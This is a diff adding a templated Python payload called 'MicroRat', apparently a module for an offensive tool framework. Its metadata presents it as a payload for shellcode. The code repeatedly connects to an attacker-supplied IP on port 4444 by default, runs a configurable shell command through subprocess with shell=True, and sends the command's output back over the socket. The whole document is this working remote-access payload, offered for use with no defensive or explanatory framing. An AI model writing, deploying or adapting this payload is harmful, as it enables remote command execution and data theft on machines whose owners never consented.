@@ -1,0 +1,25 @@
+#!name##MicroRat
+#!types##payload
+#!info##A simple python script. It connects in a loop to the server via the tcp socket, executes the command, sends the result and disconnects. You can use in shellcode.
+#!reqVar##IP_ADDR##Host ip address##str
+#!reqVar##MR_port##Host port##int
+#!setVar##MR_port##4444##int
+#!reqVar##MR_cmd##Command to be executed by Subprocess##str
+#!setVar##MR_cmd##uname -r##str
+#!import_FLAG##True
+#!render_FLAG##True
+import socket as s
+import subprocess as c
+from time import sleep
+soc = s.socket(s.AF_INET, s.SOCK_STREAM)
+while True:
+    try:
+        soc.connect(("{{IP_ADDR}}",{{MR_port}}))
+        o = c.run("{{MR_cmd}}", shell=True, capture_output=True)
+        oo = o.stderr + o.stdout
+        soc.sendall(oo)
+        soc.close()
+        break
+    except:
+        sleep(3)
+
